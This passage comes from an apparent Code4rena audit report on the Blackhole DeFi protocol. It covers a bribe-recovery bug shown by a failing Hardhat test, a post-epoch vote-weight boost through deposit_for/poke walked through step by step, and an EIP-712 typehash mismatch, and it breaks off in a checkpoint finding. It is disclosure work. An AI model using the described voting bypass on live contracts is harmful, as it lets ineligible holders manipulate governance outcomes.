<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">"1000"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockToken</span><span class="mtk1">.</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">bribeAddress</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">describe</span><span class="mtk1">(</span><span class="mtk8">"recoverERC20AndUpdateData"</span><span class="mtk1">, </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">it</span><span class="mtk1">(</span><span class="mtk8">"Should demonstrate bug in recoverERC20AndUpdateData"</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Get initial token rewards per epoch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">epochStart</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">bribe</span><span class="mtk1">.</span><span class="mtk11">getEpochStart</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">initialRewards</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">bribe</span><span class="mtk1">.</span><span class="mtk11">tokenRewardsPerEpoch</span><span class="mtk1">(</span><span class="mtk12">mockToken</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">epochStart</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Call recoverERC20AndUpdateData through the factory</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">recoveryAmount</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">"100"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">bribeFactory</span><span class="mtk1">.</span><span class="mtk11">recoverERC20AndUpdateData</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                [</span><span class="mtk12">bribe</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                [</span><span class="mtk12">mockToken</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">],</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                [</span><span class="mtk12">recoveryAmount</span><span class="mtk1">]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Get final token rewards per epoch</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">finalRewards</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">bribe</span><span class="mtk1">.</span><span class="mtk11">tokenRewardsPerEpoch</span><span class="mtk1">(</span><span class="mtk12">mockToken</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">epochStart</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// This fails because the factory uses emergencyRecoverERC20, which does not update rewards</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">finalRewards</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk11">equal</span><span class="mtk1">(</span><span class="mtk12">initialRewards</span><span class="mtk1">.</span><span class="mtk11">sub</span><span class="mtk1">(</span><span class="mtk12">recoveryAmount</span><span class="mtk1">), </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk8">"Token rewards per epoch should be updated but weren't"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">});</span></span></span></code></pre>
<p><strong>Test Result</strong>: The test fails with the following error, confirming the bug:</p>
<pre data-index="55" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">AssertionError: Expected "0" to be equal -100000000000000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">+ expected - actual</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"> {</span></span>
<span class="grvsc-line"><span class="grvsc-source">-  "_hex": "-0x056bc75e2d63100000"</span></span>
<span class="grvsc-line"><span class="grvsc-source">+  "_hex": "0x00"</span></span>
<span class="grvsc-line"><span class="grvsc-source">   "_isBigNumber": true</span></span>
<span class="grvsc-line"><span class="grvsc-source"> }</span></span></code></pre>
<p><strong>Explanation</strong>:</p>
<p>The test expects <code>tokenRewardsPerEpoch</code> to decrease by <code>100 ether</code> after calling <code>recoverERC20AndUpdateData</code> on <code>BribeFactoryV3</code>. However, because <code>emergencyRecoverERC20</code> is called instead, <code>tokenRewardsPerEpoch</code> remains unchanged (<code>0</code>), causing the test to fail.</p>
<p>This demonstrates that the incorrect function call in <code>BribeFactoryV3</code> skips the critical update to <code>tokenRewardsPerEpoch</code>, leading to potential reward over-distribution.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-44">rayss</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-22">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-35">maxvzuvex</a>.</p>
<p>The sponsor team requested that the following note be included: </p>
<blockquote>
<p>This issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.
Reference: <a href="https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/factories/BribeFactoryV3.sol#L199">https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/factories/BribeFactoryV3.sol#L199</a></p>
</blockquote>
<hr>
<h2 style="position:relative;" id="m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids"><a class="anchor before" aria-label="m 12 epoch voting restrictions bypassed via deposit_for for blacklistednon whitelisted tokenids permalink" href="#m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-283">[M-12] Epoch voting restrictions bypassed via <code>deposit_for()</code> for blacklisted/non-whitelisted <code>tokenID</code>s</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-166">rayss</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VoterV3.sol#L174">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VoterV3.sol#L174</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L816">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L816</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-2"><a class="anchor before" aria-label="finding description and impact 2 permalink" href="#finding-description-and-impact-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>The vote function in VoterV3.sol restricts voting after the epoch ends, allowing only whitelisted <code>tokenIds</code> (NFTs) or those meeting specific conditions (i.e., <code>IAutoVotingEscrowManager(avm).tokenIdToAVMId(_tokenId) == 0</code>) to continue voting. However, this restriction can be bypassed because the <code>deposit_for</code> function, which internally calls poke—does not enforce these same checks. As a result, even holders of non-whitelisted or blacklisted <code>tokenIds</code> can call <code>deposit_for</code> after the epoch has ended. While this does not allow them to vote for new pools, it does let them increase the weight of their existing votes (i.e., the pools they had previously voted for) if their NFT balance has increased. This effectively constitutes a form of post-epoch voting and undermines the intended voting restrictions.</p>
<p>Since poke recalculates voting power based on the current NFT balance (<code>uint256 _weight = IVotingEscrow(_ve).balanceOfNFT(_tokenId);</code>), a user’s voting weight can increase if their NFT balance increases (which they can do by depositing). This allows them to effectively circumvent the protocol’s intended epoch-based voting restrictions and manipulate vote weights after the voting window closesons.</p>
<h3 style="position:relative;" id="proof-of-concept-8"><a class="anchor before" aria-label="proof of concept 8 permalink" href="#proof-of-concept-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>Epoch ends: The protocol’s voting period finishes, and the vote function stops accepting new votes from non-whitelisted <code>tokenIds</code>.</li>
<li>User with non-whitelisted NFT: Alice holds an NFT that is not whitelisted (i.e., blacklisted) and thus can’t vote through the vote function anymore.</li>
<li>Alice calls <code>deposit_for()</code>: Although the epoch has ended and she cannot vote for new pools, Alice calls the <code>deposit_for</code> function with her NFT’s tokenId and passes an amount. This function internally triggers poke, which updates her vote weights.</li>
<li>Boosting vote weights: This allows Alice to increase the weight of her existing votes (to previously selected pools). Additionally, Alice could strategically vote with minimal weights to multiple pools during the active epoch, and then after the epoch ends, call <code>deposit_for()</code> to amplify those votes using her updated (larger) NFT balance—bypassing intended vote limitations (e.g, The epoch ends).</li>
<li>Votes updated: The protocol accepts the recalculated vote weights, allowing Alice to affect governance decisions even after the official voting period has ended.</li>
<li>Poking should be only allowed when epoch is active.</li>
</ol>
<h3 style="position:relative;" id="impact-9"><a class="anchor before" aria-label="impact 9 permalink" href="#impact-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Users with non-whitelisted or blacklisted NFTs can bypass epoch restrictions by using the poke function after the epoch period ends.</li>
<li>Unauthorized vote recasting allows these users to increase their voting power outside the designated voting window.</li>
<li>Malicious actors could unfairly influence governance proposals beyond intended timeframes.</li>
</ul>
<h3 style="position:relative;" id="severity-justification-1"><a class="anchor before" aria-label="severity justification 1 permalink" href="#severity-justification-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity Justification</h3>
<p>Access control is broken. This issue is of medium severity because it enables users to bypass the core voting restrictions enforced by the protocol. The <code>vote()</code> function is designed to block votes after the epoch ends unless specific conditions are met (such as the NFT being whitelisted or having no AVM mapping). However, the <code>poke()</code> function lacks these same restrictions, allowing users (including those with blacklisted or ineligible NFTs) to recast votes even after the epoch has concluded. Since <code>poke()</code> recalculates vote weights based on the current balance of the NFT, users can amplify their voting power post-deadline by increasing their NFT balance and calling <code>deposit_for()</code>, which calls poke. This undermines the intended finality of the voting period, introduces inconsistent access control, and opens the door for manipulation of governance outcomes.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-13"><a class="anchor before" aria-label="recommended mitigation steps 13 permalink" href="#recommended-mitigation-steps-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Implement the same epoch and whitelist checks in the poke function as in the vote function to prevent unauthorized vote recasting after the epoch ends.</p>
<p><strong>Blackhole disputed</strong></p>
<hr>
<h2 style="position:relative;" id="m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation"><a class="anchor before" aria-label="m 13 eip 712 domain type hash mismatch breaks signature based delegation permalink" href="#m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-35">[M-13] EIP-712 domain type hash mismatch breaks signature-based delegation</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-48">newspacexyz</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1205">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1205</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1327-L1335">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1327-L1335</a></p>
<h3 style="position:relative;" id="finding-description-9"><a class="anchor before" aria-label="finding description 9 permalink" href="#finding-description-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>There is a mistake in how the <code>DOMAIN_TYPEHASH</code> constant is defined and used in the <code>VotingEscrow</code> contract.</p>
<pre data-index="56" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">constant</span><span class="mtk1"> </span><span class="mtk12">DOMAIN_TYPEHASH</span><span class="mtk1"> = </span><span class="mtk11">keccak256</span><span class="mtk1">(</span><span class="mtk8">"EIP712Domain(string name,uint256 chainId,address verifyingContract)"</span><span class="mtk1">);</span></span></span></code></pre>
<p>However, when building the domain separator, the contract includes an additional parameter:</p>
<pre data-index="57" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">domainSeparator</span><span class="mtk1"> = </span><span class="mtk11">keccak256</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&nbsp; &nbsp; </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encode</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="mtk12">DOMAIN_TYPEHASH</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="mtk11">keccak256</span><span class="mtk1">(</span><span class="mtk11">bytes</span><span class="mtk1">(</span><span class="mtk12">name</span><span class="mtk1">)),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="mtk11">keccak256</span><span class="mtk1">(</span><span class="mtk11">bytes</span><span class="mtk1">(</span><span class="mtk12">version</span><span class="mtk1">)),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">chainid</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&nbsp; &nbsp; )</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span></code></pre>
<p>The problem is that the <code>DOMAIN_TYPEHASH</code> does <strong>not</strong> include the <code>version</code> parameter, but the contract still tries to encode it. This creates a mismatch between the type hash and the actual encoding, which will lead to incorrect <code>digest</code> hashes when signing or verifying messages.</p>
<h3 style="position:relative;" id="impact-10"><a class="anchor before" aria-label="impact 10 permalink" href="#impact-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Users will be unable to sign or verify messages using the EIP-712 delegation feature.</li>
<li>Delegation by signature (<code>delegateBySig</code>) will always fail due to signature mismatch.</li>
<li>Governance features relying on off-chain signatures will break.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-14"><a class="anchor before" aria-label="recommended mitigation steps 14 permalink" href="#recommended-mitigation-steps-14"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Update the <code>DOMAIN_TYPEHASH</code> to include the <code>version</code> field so that it matches the data structure used in the actual <code>domainSeparator</code>:</p>
<pre data-index="58" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">constant</span><span class="mtk1"> </span><span class="mtk12">DOMAIN_TYPEHASH</span><span class="mtk1"> = </span><span class="mtk11">keccak256</span><span class="mtk1">(</span><span class="mtk8">"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"</span><span class="mtk1">);</span></span></span></code></pre>
<p>This change ensures the type hash includes all the fields being encoded and fixes the signature validation logic.</p>
<p><strong>Blackhole marked as informative</strong></p>
<hr>
<h1 style="position:relative;" id="governor"><a class="anchor before" aria-label="governor permalink" href="#governor"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="#governor">Governor</a></h1>
<h1 style="position:relative;" id="medium-risk-findings-9"><a class="anchor before" aria-label="medium risk findings 9 permalink" href="#medium-risk-findings-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Medium Risk Findings (9)</h1>
<h2 style="position:relative;" id="m-14-checkpoints-are-incorrectly-cleared-during-transferfrom"><a class="anchor before" aria-label="m 14 checkpoints are incorrectly cleared during transferfrom permalink" href="#m-14-checkpoints-are-incorrectly-cleared-during-transferfrom"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-153">[M-14] Checkpoints are incorrectly cleared during <code>transferFrom</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-236">rashmor</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/libraries/VotingDelegationLib.sol#L46-L110">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/libraries/VotingDelegationLib.sol#L46-L110</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-3"><a class="anchor before" aria-label="finding description and impact 3 permalink" href="#finding-description-and-impact-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>In the <code>VotingEscrow</code> contract, the <code>transferFrom</code> function delegates to <code>_transferFrom</code>, which in turn calls <code>moveTokenDelegates</code> from <code>VotingDelegationLib</code>. This function is responsible for updating historical checkpoints that track which token IDs were delegated to which addresses.</p>
<p>During this process, a flaw occurs in the cleanup logic for the source representative (<code>srcRep</code>). Specifically, when <code>_isCheckpointInNewBlock == false</code>, the function attempts to mutate the existing checkpoint array (<code>srcRepNew</code>) in-place by removing any token ID that no longer belongs to <code>srcRep</code>:</p>
